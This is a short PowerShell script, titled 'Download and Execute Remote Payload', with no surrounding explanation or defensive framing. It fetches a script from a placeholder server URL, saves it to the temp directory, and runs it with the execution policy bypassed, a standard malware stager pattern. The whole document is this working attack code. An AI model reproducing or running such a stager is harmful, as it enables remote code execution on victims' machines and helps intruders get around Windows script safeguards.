# Download and Execute Remote Payload
$url = 'http://your-server/payload.ps1'
$output = "$env:TEMP\payload.ps1"
Invoke-WebRequest -Uri $url -OutFile $output
powershell -ExecutionPolicy Bypass -File $output